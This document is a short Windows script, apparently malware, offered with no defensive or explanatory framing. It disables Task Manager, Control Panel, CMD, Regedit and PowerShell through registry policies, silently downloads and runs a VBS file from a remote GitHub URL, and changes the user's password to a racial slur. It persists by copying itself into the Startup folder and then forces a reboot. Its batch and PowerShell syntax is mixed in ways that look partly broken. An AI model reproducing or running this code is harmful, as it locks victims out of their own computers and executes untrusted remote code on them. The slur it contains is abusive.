:: Disable Task Manager, Settings, CMD, Administrator CMD, Regedit, PowerShell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowerShell /t REG_DWORD /d 1 /f

:: run the script
conhost.exe --headless powershell -WindowStyle Hidden -NoProfile -Command ^^
  "$p=$env:APPDATA+'\Microsoft\Windows\PowerShell\PSReadLine\xzhdbzkxskjhda.vbs';" ^^
  "if(-not (Test-Path $p)){" ^^
  "iwr https://raw.githubusercontent.com/SkiddKillz/VBS/refs/heads/main/VBS.vbs -OutFile $p };" ^^
  "if(Test-Path $p){ Start-Process $p }"

:: change user acc pass
net user $env:USERNAME NIGGERGOTFEDDED

:: Create a new batch script
$batchContent = @"
@echo off
:: Disable Task Manager, Settings, CMD, Administrator CMD, Regedit, PowerShell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowerShell /t REG_DWORD /d 1 /f

:: Run the script
conhost.exe --headless powershell -WindowStyle Hidden -NoProfile -Command ^^
  "$p=$env:APPDATA+'\Microsoft\Windows\PowerShell\PSReadLine\xzhdbzkxskjhda.vbs';" ^^
  "if(-not (Test-Path $p)){" ^^
  "iwr https://raw.githubusercontent.com/SkiddKillz/VBS/refs/heads/main/VBS.vbs -OutFile $p };" ^^
  "if(Test-Path $p){ Start-Process $p }"
"@

:: Save the batch script to a file
$batchPath = "$env:TEMP\disable_features.bat"
$batchContent | Out-File -FilePath $batchPath

:: Move the batch script to the startup folder
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item -Path $batchPath -Destination $startupPath

:: Restart the computer
shutdown /r /t 0
